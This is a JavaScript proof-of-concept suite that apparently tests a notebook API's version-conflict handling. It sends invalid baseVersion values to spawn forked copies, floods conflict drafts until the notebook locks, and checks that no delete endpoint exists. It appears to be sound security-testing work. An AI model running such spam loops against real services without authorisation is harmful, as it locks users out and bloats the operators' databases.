// PoC 05: Notebook OCC & Conflict Draft Abuse Suite
const { BASE_URL, registerTestUser, authHeaders } = require('./common');

async function createNotebook(user, title = 'Original Notebook') {
  const res = await fetch(`${BASE_URL}/notebooks`, {
    method: 'POST',
    headers: authHeaders(user.accessToken),
    body: JSON.stringify({
      title,
      contentAstJson: JSON.stringify({
        type: 'doc',
        content: [
          {
            type: 'paragraph',
            content: [{ type: 'text', text: 'Initial notebook content.' }]
          }
        ]
      })
    })
  });
  return await res.json();
}

async function testWrongBaseVersionConflicts(user) {
  console.log('\n--- 5.1 Testing Conflict Draft Creation with Wrong baseVersion ---');
  const nb = await createNotebook(user, 'OCC Conflict Test NB');
  console.log(`Created notebook ${nb.id}, current version = ${nb.version}`);

  const testVersions = [-1, 0, 9999];
  const results = [];

  for (const v of testVersions) {
    const res = await fetch(`${BASE_URL}/notebooks/${nb.id}`, {
      method: 'PUT',
      headers: authHeaders(user.accessToken),
      body: JSON.stringify({
        title: `Updated Title with v=${v}`,
        contentAstJson: JSON.stringify({
          type: 'doc',
          content: [{ type: 'paragraph', content: [{ type: 'text', text: `Conflict version ${v}` }] }]
        }),
        baseVersion: v
      })
    });
    const data = await res.json();
    console.log(`baseVersion=${v}: status=${res.status}, error=${data.error}, conflictCopyId=${data.conflictCopyNotebook?.id}`);
    results.push({
      baseVersion: v,
      status: res.status,
      error: data.error,
      forkId: data.conflictCopyNotebook?.id
    });
  }

  const allSpawnedForks = results.every(r => r.status === 409 && r.error === 'CONFLICT_KEEP_BOTH');
  console.log(`VULNERABILITY CONFIRMED: Any arbitrary/invalid baseVersion spawns a new forked notebook: ${allSpawnedForks}`);

  return {
    test: 'wrong_base_version_spawns_forks',
    allSpawnedForks,
    results,
    originalNbId: nb.id
  };
}

async function testConflictDraftLimit20(user, notebookId) {
  console.log('\n--- 5.2 Testing Hitting 20 Conflict Drafts Limit and Permanent Lock ---');
  let conflictCount = 3; // Already did 3 in 5.1
  let hitLimit = false;
  let finalStatus = null;
  let finalError = null;

  for (let i = conflictCount + 1; i <= 22; i++) {
    const res = await fetch(`${BASE_URL}/notebooks/${notebookId}`, {
      method: 'PUT',
      headers: authHeaders(user.accessToken),
      body: JSON.stringify({
        title: `Spam conflict ${i}`,
        contentAstJson: JSON.stringify({
          type: 'doc',
          content: [{ type: 'paragraph', content: [{ type: 'text', text: `Spam content ${i}` }] }]
        }),
        baseVersion: 999
      })
    });
    const data = await res.json();
    if (data.error === 'CONFLICT_DRAFT_LIMIT_REACHED') {
      hitLimit = true;
      finalStatus = res.status;
      finalError = data.error;
      console.log(`At iteration ${i}: Hit limit! status=${res.status}, error=${data.error}`);
      break;
    }
  }

  console.log(`VULNERABILITY / BEHAVIOR CONFIRMED: After 20 conflict drafts, notebook rejects with CONFLICT_DRAFT_LIMIT_REACHED: ${hitLimit}`);

  return {
    test: 'conflict_draft_limit_reached',
    hitLimit,
    finalStatus,
    finalError
  };
}

async function testDatabaseBloatAndNoDelete(user) {
  console.log('\n--- 5.3 Testing Database Bloat via Multi-Notebook Spawning & Lack of Delete Endpoint ---');

  // Check how many notebooks user now has
  const listRes = await fetch(`${BASE_URL}/notebooks`, {
    headers: authHeaders(user.accessToken)
  });
  const notebooks = await listRes.json();
  console.log(`User now owns ${notebooks.length} notebooks (including all conflict fork copies)!`);

  // Attempt to delete one of the forked notebooks
  const forkedNb = notebooks.find(n => n.title.includes('Bản sao xung đột'));
  if (forkedNb) {
    const delRes = await fetch(`${BASE_URL}/notebooks/${forkedNb.id}`, {
      method: 'DELETE',
      headers: authHeaders(user.accessToken)
    });
    console.log(`Attempt DELETE /notebooks/${forkedNb.id}: status=${delRes.status} (expected 405 Method Not Allowed)`);
    console.log(`VULNERABILITY CONFIRMED: No DELETE endpoint exists for notebooks or conflict drafts; bloat is irreversible: ${delRes.status === 405}`);
    return {
      test: 'database_bloat_irreversible',
      totalNotebooksCount: notebooks.length,
      deleteStatus: delRes.status,
      noDeleteEndpoint: delRes.status === 405
    };
  }

  return {
    test: 'database_bloat_irreversible',
    totalNotebooksCount: notebooks.length
  };
}

async function main() {
  console.log('=== STARTING POC-05: NOTEBOOK OCC ABUSE SUITE ===');
  const user = await registerTestUser(`nb-user-${Date.now().toString().slice(-4)}`);

  const r1 = await testWrongBaseVersionConflicts(user);
  const r2 = await testConflictDraftLimit20(user, r1.originalNbId);
  const r3 = await testDatabaseBloatAndNoDelete(user);

  console.log('\n=== SUMMARY OF POC-05 FINDINGS ===');
  console.log(JSON.stringify({ r1, r2, r3 }, null, 2));
}

main().catch(err => {
  console.error('Fatal error in poc-05:', err);
  process.exit(1);
});
